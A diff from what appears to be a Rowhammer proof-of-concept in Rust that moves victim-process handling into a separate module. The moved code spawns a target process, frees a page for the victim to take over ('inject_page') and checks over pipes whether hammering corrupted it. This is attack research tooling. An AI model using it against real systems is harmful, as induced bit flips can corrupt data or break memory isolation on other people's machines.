@@ -15,12 +15,14 @@ use bs_poc::hammerer::blacksmith::hammerer::{
 };
 use bs_poc::hammerer::Hammering;
 use bs_poc::memory::mem_configuration::MemConfiguration;
-use bs_poc::victim::HammerVictim;
+use bs_poc::victim::process::VictimProcess;
+use bs_poc::victim::{process, HammerVictim};
 use bs_poc::{
     allocator,
     allocator::{BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap},
     hammerer,
     memory::ConsecCheck,
+    victim,
 };
 use bs_poc::{
     memory::{
@@ -235,81 +237,6 @@ fn hammer(
     hammerer.hammer(victim, 3)
 }
 
-/// spawn a thread to log the victim's stderr
-fn log_victim_stderr(victim: &mut Option<Child>) -> anyhow::Result<()> {
-    if let Some(victim) = victim {
-        let stderr = victim.stderr.take().context("victim stderr")?;
-        thread::spawn(move || {
-            let reader = BufReader::new(stderr);
-            for line in reader.lines() {
-                info!(target: "victim", "{}", line.unwrap());
-            }
-        });
-    }
-    Ok(())
-}
-
-fn spawn_victim(victim: &[String]) -> anyhow::Result<Option<Child>, std::io::Error> {
-    let mut victim_args = victim.to_vec();
-    let victim = victim_args.pop();
-    victim
-        .map(|victim| {
-            Command::new(victim)
-                .args(victim_args)
-                .stdin(std::process::Stdio::piped())
-                .stdout(std::process::Stdio::piped())
-                .stderr(std::process::Stdio::piped())
-                .spawn()
-        })
-        .transpose()
-}
-
-fn inject_page<P: IPC<AttackState>>(channel: &mut P) -> anyhow::Result<()> {
-    channel.send(AttackState::AttackerReady)?;
-
-    let b = MemBlock::mmap(PAGE_SIZE)?;
-    let pfn = b.pfn()?;
-    info!("Victim block PFN: 0x{:02x}", pfn);
-
-    info!("Waiting for signal {:?}", AttackState::VictimAllocReady);
-    channel.wait_for(AttackState::VictimAllocReady)?;
-    info!("Received signal {:?}", AttackState::VictimAllocReady);
-
-    b.dealloc();
-    warn!("TODO release victim page (determined by mapping)");
-    Ok(())
-}
-
-fn piped_channel(child: &mut Child) -> anyhow::Result<PipeIPC<ChildStdout, ChildStdin>> {
-    let child_in = child.stdin.take().context("piped_channel stdin")?;
-    let child_out = child.stdout.take().context("piped_channel stdout")?;
-    Ok(PipeIPC::new(child_out, child_in))
-}
-
-struct VictimProcess<P> {
-    pipe: P,
-}
-impl<P: IPC<AttackState>> HammerVictim for VictimProcess<P> {
-    fn init(&mut self) {
-        info!("Victim process initialized");
-    }
-
-    fn check(&mut self) -> bool {
-        info!("Victim process check");
-        self.pipe
-            .send(AttackState::AttackerHammerDone)
-            .expect("send");
-        info!("Reading pipe");
-        let state = self.pipe.receive().expect("receive");
-        info!("Received state: {:?}", state);
-        state == AttackState::VictimHammerSuccess
-    }
-
-    fn log_report(&self) {
-        info!("Victim process report");
-    }
-}
-
 unsafe fn _main() -> anyhow::Result<()> {
     let progress = init_logging_with_progress()?;
 
@@ -333,20 +260,20 @@ unsafe fn _main() -> anyhow::Result<()> {
     let memory = allocator::alloc_memory(alloc_strategy, mem_config, &pattern.mapping)?;
     info!("Allocated {} bytes of memory", memory.len());
 
-    let mut victim = spawn_victim(&args.target)?;
-    log_victim_stderr(&mut victim)?;
+    let mut victim = process::spawn_victim(&args.target)?;
+    process::log_victim_stderr(&mut victim)?;
 
     let mut hammer_victim: Box<dyn HammerVictim> = match &mut victim {
         Some(victim) => {
-            let mut pipe: PipeIPC<ChildStdout, ChildStdin> = piped_channel(victim)?;
-            inject_page(&mut pipe)?;
-            Box::new(VictimProcess { pipe })
+            let mut pipe: PipeIPC<ChildStdout, ChildStdin> = process::piped_channel(victim)?;
+            process::inject_page(&mut pipe)?;
+            Box::new(victim::Process::new(pipe))
         }
         None => {
             warn!(
             "No target specified. Consider `./hammer --config [...] your_victim your_victim_args`"
         );
-            Box::new(HammerVictimMemCheck::new(mem_config, &memory))
+            Box::new(victim::MemCheck::new(mem_config, &memory))
         }
     };
 
